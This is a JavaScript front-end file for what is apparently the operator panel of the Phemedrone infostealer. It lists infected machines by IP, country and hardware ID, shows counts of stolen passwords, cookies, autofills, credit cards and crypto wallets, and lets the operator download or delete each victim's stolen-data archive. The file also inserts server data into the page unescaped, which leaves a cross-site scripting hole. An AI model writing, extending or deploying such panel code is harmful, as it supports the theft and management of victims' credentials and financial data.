let logsCountNum = 1;
const itemsPerPage = 10;
let currentPage = 1;

function renderTable() {
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;

    getLogs();

    updatePagination();
}

function getIconColor(value) {
    if (value > 10) return 'icon-green';
    if (value > 5) return 'icon-yellow';
    if (value > 0) return 'icon-red';
    return 'icon-blue';
}

function updatePagination() {
    const totalPages = Math.ceil(logsCountNum / itemsPerPage);
    document.getElementById('currentPage').textContent = currentPage;
    document.getElementById('totalPages').textContent = totalPages;
    document.getElementById('prevPage').disabled = currentPage === 1;
    document.getElementById('nextPage').disabled = currentPage === totalPages;
}


document.getElementById('tableBody').addEventListener('click', function(event) {

    if (event.target.classList.contains('btn-download')) {

        const row = event.target.closest('tr');
        const ip = row.cells[0].textContent;
        


        const countryImg = row.cells[1].querySelector('img');
        var countryC = countryImg.alt;

        downloadFile(row.cells[2].textContent, countryC, ip);
    }

    if (event.target.classList.contains('btn-delete')) {
        const row = event.target.closest('tr');
        

        deleteLog(row.cells[2].textContent);
        renderTable();
    }
});

document.getElementById('prevPage').addEventListener('click', () => {
    if (currentPage > 1) {
        currentPage--;
        renderTable();
    }
});

document.getElementById('nextPage').addEventListener('click', () => {
    const totalPages = Math.ceil(data.length / itemsPerPage);
    if (currentPage < totalPages) {
        currentPage++;
        renderTable();
    }
});



function makeid(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function downloadFile(hwid, countryC, ip) {
    if (!hwid) {
        return;
    }

    const url = `../api/download.php?hwid=${encodeURIComponent(hwid)}`;

    fetch(url, {
        method: 'GET',
        credentials: 'same-origin'
    })
    .then(response => {
        if (response.ok) {
            return response.blob();
        } else {
            return response.json().then(data => {
                throw new Error(data.error || 'Error downloading file');
            });
        }
    })
    .then(blob => {

        const downloadLink = document.createElement('a');
        downloadLink.href = window.URL.createObjectURL(blob);
        downloadLink.download = '[' + countryC + ']' + ip +  '-Phemedrone.zip';
        downloadLink.click();
    })
    .catch(error => {
        console.error('Download failed:', error);
    });
}

function deleteLog(hwid) {
    if (!hwid) {
        return;
    }

    fetch('../api/delete.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        credentials: 'same-origin',
        body: `hwid=${encodeURIComponent(hwid)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Record deleted:', data.success);
        } else {
            throw new Error(data.error || 'Error deleting record');
        }
    })
    .catch(error => {
        console.error('Deletion failed:', error);
    });
}



function getLogs() {
    
    fetch('../api/getLogs.php', {
        method: 'GET',
        credentials: 'same-origin'
    })
    .then(response => response.json())
    .then(data => {
        if (data.logs) {
            const logsTableBody = document.getElementById('tableBody');

            logsTableBody.innerHTML = '';

            data.logs.forEach(log => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${log.ip}</td>
                    <td><img src="https://flagcdn.com/w20/${log.countryCode.toLowerCase()}.png" width="20" alt="${log.countryCode}"> ${log.country}</td>
                    <td>${log.hwid}</td>
                    <td><i class="fas fa-key icon-gold"></i> ${log.passwords}</td>
                    <td><i class="fas fa-cookie-bite icon-brown"></i> ${log.cookies}</td>
                    <td><i class="fas fa-solid fa-copy icon-white"></i> ${log.autofills}</td>
                    <td><i class="fas fa-credit-card icon-blue"></i> ${log.creditCards}</td>
                    <td><i class="fas fa-wallet icon-green"></i> ${log.wallets}</td>
                    <td>
                        <button class="btn btn-download">Download</button>
                        <button class="btn btn-delete">Delete</button>
                    </td>
                `;
                logsTableBody.appendChild(row);
            });

            const logsCountElement = document.getElementById('total-logs');
            logsCountElement.textContent = `Total logs: ${data.logsCount}`;
            logsCountNum = (Number(data.logsCount === 0 ? 1 : Number(data.logsCount)));
        } else if (data.error) {
            console.error('Error fetching logs:', data.error);
        }
    })
    .catch(error => {
        console.error('Request failed:', error);
    });
}


// Initial render
renderTable();

